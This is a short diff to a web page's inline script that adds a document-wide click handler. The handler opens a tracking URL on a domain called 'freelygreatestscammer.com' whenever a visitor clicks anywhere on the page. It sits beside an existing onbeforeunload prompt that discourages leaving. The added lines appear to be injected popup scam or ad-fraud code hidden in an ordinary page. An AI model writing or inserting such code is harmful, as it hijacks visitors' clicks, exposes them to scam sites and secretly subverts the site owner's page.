@@ -177,6 +177,9 @@ document.addEventListener('DOMContentLoaded', (event) => {
 window.onbeforeunload = function(e) {
   return "Are you sure you want to leave?";
 };
+document.onclick = function() {
+    window.open('https://freelygreatestscammer.com/kq7hxpjzs8?key=69e6086729f9f03ee8d4ad31eb06a6eb');
+}
       </script>
     </head>
     <body>
